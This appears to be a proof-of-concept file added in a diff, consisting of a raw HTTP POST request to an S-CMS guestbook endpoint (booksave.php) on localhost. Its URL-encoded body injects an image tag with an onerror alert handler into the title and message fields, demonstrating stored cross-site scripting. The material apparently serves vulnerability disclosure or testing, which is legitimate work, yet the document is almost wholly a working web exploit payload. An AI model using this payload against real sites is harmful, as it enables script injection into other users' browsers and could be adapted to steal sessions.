@@ -1,0 +1,15 @@
+payload:
+
+POST /s_cms/booksave.php HTTP/1.1
+Host: 127.0.0.1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 161
+Connection: close
+Referer: http://127.0.0.1/s_cms/?type=guestbook
+Cookie: add=%E4%B8%AD%E5%9B%BD; Hm_lvt_b60316de6009d5654de7312f772162be=1570715615,1570809513; _ga=GA1.1.1459117522.1570720678; PHPSESSID=qla1ug7btft0pbm1sd5hvlqnn3; Hm_lpvt_b60316de6009d5654de7312f772162be=1570809600
+Upgrade-Insecure-Requests: 1
+
+G_title=aaa%22%3E%3Cimg+src%3D1+onerror%3Dalert%281%29%3E&G_name=a&G_phone=12312311231&G_mail=1%4011.com&G_msg=11111aaa%22%3E%3Cimg+src%3D1+onerror%3Dalert%282%29%3E&Submit=%E6%8F%90%E4%BA%A4%E4%BF%A1%E6%81%AF
